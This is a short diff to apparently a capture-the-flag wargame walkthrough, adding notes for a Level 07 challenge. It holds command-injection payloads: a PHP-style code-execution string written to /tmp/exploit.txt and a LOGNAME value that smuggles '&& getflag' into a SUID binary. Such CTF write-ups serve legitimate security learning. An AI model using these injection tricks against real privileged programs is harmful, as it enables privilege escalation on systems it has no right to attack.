@@ -104,3 +104,10 @@ watch -n 1 ls -la /opt/openarenaserver/
 ```
 echo '[x {${`getflag`}}]' > /tmp/exploit.txt
 ```
+
+# Level 07
+- Available file
+=> Binary SUID executed as flag07
+
+- Change LOGNAME env variable to malicious
+```export LOGNAME="coucou && getflag | cat"```
